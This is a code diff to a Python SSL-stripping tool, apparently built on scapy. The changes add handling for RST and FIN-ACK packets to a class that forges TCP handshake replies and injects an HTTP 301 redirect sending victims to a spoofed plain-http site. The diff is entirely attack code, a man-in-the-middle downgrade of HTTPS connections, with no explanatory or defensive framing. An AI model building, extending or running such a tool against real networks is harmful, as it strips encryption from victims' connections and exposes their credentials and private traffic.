@@ -33,6 +33,11 @@ class SSLStripper:
             log_warning("Ignoring packet from {} because it is not intended for us but for {}".format(packet[IP].src, packet[IP].dst))
             return
         
+        # Do nothing on RST
+        if packet.haslayer(TCP) and packet[TCP].flags == 0x04:
+            log_warning("Ignoring RST packet from {}".format(packet[IP].src))
+            return
+
         # Check if we have a SYN packet to start the handshake.
         if packet.haslayer(TCP) and packet[TCP].flags == 0x02:  # SYN
             log_info("Received SYN packet from {}".format(packet[IP].src))
@@ -45,6 +50,16 @@ class SSLStripper:
             send(response, verbose=0)
             log_info("Sent SYN-ACK packet to {}".format(packet[IP].src))
 
+        # Handle FIN-ACK packets
+        if packet.haslayer(TCP) and packet[TCP].flags == 0x11:
+            log_info("Received FIN-ACK packet from {}".format(packet[IP].src))
+            # Construct the response
+            response = (IP(dst=packet[IP].src, src=packet[IP].dst) /
+                        TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="FA", 
+                            seq=packet[TCP].ack, ack=packet[TCP].seq + 1))
+            send(response, verbose=0)
+            log_info("Sent FIN-ACK packet to {}".format(packet[IP].src))
+
         # Check if we have an ACK packet to complete the handshake.
         elif packet.haslayer(TCP) and packet[TCP].flags == 0x10:  # ACK
             log_info("Received ACK packet from {}".format(packet[IP].src))
@@ -56,13 +71,14 @@ class SSLStripper:
 
             # Construct the HTTP 301 Moved Permanently response
             response = (IP(dst=packet[IP].src, src=packet[IP].dst) /
-                        TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="FA",
+                        TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="PA",
                             seq=packet[TCP].ack, ack=packet[TCP].seq + len(packet[TCP].payload)) /
                         Raw(load="HTTP/1.1 301 Moved Permanently\r\n"
                                  "Location: http://{}\r\n\r\n".format(self.site_to_spoof)))
             
             send(response, verbose=0)
             log_info("Sent HTTP response to {}".format(packet[IP].src))
+
 
 def add_iptables_rule(port):
     # Add the iptables rule to drop incoming packets for the specified port
